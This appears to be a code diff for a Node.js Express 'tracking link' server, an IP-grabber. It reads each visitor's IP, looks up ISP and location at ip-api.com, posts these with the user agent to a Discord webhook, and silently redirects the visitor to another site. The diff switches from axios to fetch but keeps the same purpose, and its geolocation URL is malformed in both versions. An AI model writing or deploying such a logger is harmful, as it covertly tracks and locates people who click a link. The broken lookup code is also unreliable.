@@ -1,23 +1,18 @@
 const express = require('express');
-const axios = require('axios');
 const app = express();
 
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
-const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol/xsaint'; 
+const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol';
 
 app.get('/', async (req, res) => {
-    // 1. Grab raw header tracking string
+    // 1. Safely parse out the real visitor IP from the Render proxy string
     let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-    
-    // 2. FIXED: Isolates the first clean IP address before any proxy commas without using array split methods
-    let clientIp = rawIp.replace(/,.*$/, '').trim();
+    let clientIp = rawIp.split(',')[0].trim(); // Pulls position 0 safely
 
-    // 3. Strip internal IPv6 encapsulation if Render presents a hybrid address
+    // 2. Clear out local server loop values
     if (clientIp.includes('::ffff:')) {
         clientIp = clientIp.replace('::ffff:', '');
     }
-
-    // 4. Fallback safeguard for testing routes locally or if empty
     if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') {
         clientIp = '8.8.8.8'; 
     }
@@ -26,11 +21,9 @@ app.get('/', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) {
         try {
-            // 5. Build URL safely with standard string chaining
-            const apiUrl = 'http://ip-api.com' + clientIp + '?fields=61439';
-            
-            const geoResponse = await axios.get(apiUrl);
-            const geoData = geoResponse.data;
+            // 3. Using native fetch() bypasses the Axios ERR_INVALID_URL adapter bug entirely
+            const geoResponse = await fetch(`http://ip-api.com{clientIp}?fields=61439`);
+            const geoData = await geoResponse.json();
 
             const discordPayload = {
                 embeds: [{
@@ -38,10 +31,10 @@ app.get('/', async (req, res) => {
                     color: 15548997, 
                     description: "A user has accessed the tracking link.",
                     fields: [
-                        { name: "IP Address", value: "`" + clientIp + "`", inline: true },
-                        { name: "ISP Network", value: "`" + (geoData.isp || "Unknown") + "`", inline: true },
-                        { name: "Location", value: "`" + (geoData.city || "Unknown") + ", " + (geoData.country || "Unknown") + "`", inline: false },
-                        { name: "Device / Agent", value: "```" + userAgent + "```", inline: false }
+                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
+                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
+                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
+                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                     ],
                     footer: {
                         text: "System Monitor"
@@ -50,8 +43,11 @@ app.get('/', async (req, res) => {
                 }]
             };
 
-            axios.post(DISCORD_WEBHOOK_URL, discordPayload).catch(err => {
-                console.error("Webhook Delivery Failed:", err.message);
+            // 4. Send directly to your Discord webhook using native fetch
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
             });
 
         } catch (error) {
@@ -62,7 +58,7 @@ app.get('/', async (req, res) => {
     res.redirect(302, REDIRECT_URL);
 });
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
